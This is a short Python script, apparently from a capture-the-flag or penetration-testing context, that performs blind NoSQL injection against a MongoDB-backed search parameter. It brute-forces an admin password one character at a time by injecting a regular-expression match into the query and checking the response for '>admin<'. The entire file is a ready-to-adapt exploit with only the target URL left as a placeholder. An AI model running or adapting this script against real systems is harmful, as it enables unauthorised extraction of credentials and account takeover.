#!/usr/bin/python3
import urllib.request
import string

URL="http://<url>"

def check(payload):
#Below is for MongoDB version. Should be customize as per the purpose
    url=URL+"/?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/"+payload+"/)%00"
    print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    return ">admin<" in str(data)

#print(check("^5b317d.*$"))
#print(check("^delo.*$"))

CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
    for c in CHARSET:
        print("Trying: "+c+" for "+password)
        test = password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)
~                                                                                                                                                            ~                            
